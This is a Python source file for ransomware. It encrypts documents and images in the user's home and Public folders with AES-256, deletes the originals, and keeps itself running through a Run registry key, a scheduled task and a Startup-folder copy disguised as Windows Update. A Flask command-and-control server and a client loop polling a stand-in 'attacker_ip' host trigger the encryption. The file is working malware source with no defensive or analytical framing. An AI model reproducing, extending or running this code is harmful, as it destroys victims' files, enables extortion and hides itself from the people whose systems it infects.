import os
import time
import winreg
import shutil
import threading
import requests
from flask import Flask, request
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2

# === Stronger AES-256 Encryption ===
SALT = b'secure_salt'
PASSWORD = b'StrongerPassword!123'
KEY = PBKDF2(PASSWORD, SALT, dkLen=32, count=1000000)
IV = get_random_bytes(16)

def encrypt_file(file_path):
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    with open(file_path, 'rb') as f:
        data = f.read()
    
    pad_length = 16 - (len(data) % 16)
    data += bytes([pad_length] * pad_length)
    
    encrypted_data = cipher.encrypt(data)
    with open(file_path + ".locked", 'wb') as f:
        f.write(IV + encrypted_data)
    os.remove(file_path)

def encrypt_system_files():
    target_dirs = [os.path.expanduser("~"), "C:\\Users\\Public\\"]
    file_extensions = ['.txt', '.pdf', '.jpg', '.docx', '.png']
    
    for directory in target_dirs:
        for root, _, files in os.walk(directory):
            for file in files:
                if any(file.endswith(ext) for ext in file_extensions):
                    encrypt_file(os.path.join(root, file))

# === Persistence Mechanisms ===
def add_registry_persistence():
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    script_path = os.path.abspath(__file__)
    
    try:
        reg = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(reg, "WinUpdate", 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(reg)
    except Exception as e:
        print(f"Registry persistence failed: {e}")

def add_scheduled_task():
    script_path = os.path.abspath(__file__)
    command = f'schtasks /create /tn "WinUpdate" /tr "{script_path}" /sc ONLOGON /rl HIGHEST /f'
    os.system(command)

def add_startup_persistence():
    script_path = os.path.abspath(__file__)
    startup_folder = os.path.join(os.getenv('APPDATA'), "Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe")
    shutil.copy(script_path, startup_folder)

# === Flask Web C2 ===
app = Flask(__name__)
command = ""

@app.route("/command", methods=["GET"])
def get_command():
    return command

@app.route("/set_command", methods=["POST"])
def set_command():
    global command
    command = request.form["cmd"]
    return "Command Set!"

def start_flask_c2():
    app.run(host="0.0.0.0", port=5000)

# === Malware Client Side ===
def connect_to_flask_c2():
    server_url = "http://attacker_ip:5000/command"
    while True:
        response = requests.get(server_url).text
        if response == "encrypt":
            encrypt_system_files()
        time.sleep(5)

if __name__ == "__main__":
    add_registry_persistence()
    add_scheduled_task()
    add_startup_persistence()
    
    # Start C2 Server
    threading.Thread(target=start_flask_c2).start()
    
    # Start Client Connection to Flask C2
    threading.Thread(target=connect_to_flask_c2).start()
